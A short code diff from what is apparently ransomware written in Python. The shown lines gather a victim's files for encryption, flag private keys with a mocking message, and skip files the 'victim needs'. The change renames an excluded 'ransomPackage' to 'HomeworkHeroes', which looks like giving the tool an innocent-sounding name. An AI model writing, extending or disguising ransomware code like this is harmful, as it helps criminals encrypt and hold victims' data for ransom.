@@ -38,7 +38,7 @@ for filename in files:
         important.append(filename)
         print ("I see you have a private key, let me validate that for you...")
 
-    elif ".pem" not in filename and "ransomPackage" not in filename and "send" not in filename:    #This makes sure we do not accidentally Encrypt things victim needs
+    elif ".pem" not in filename and "HomeworkHeroes" not in filename and "send" not in filename:    #This makes sure we do not accidentally Encrypt things victim needs
         file_list.append(filename)
 ###############################################
 
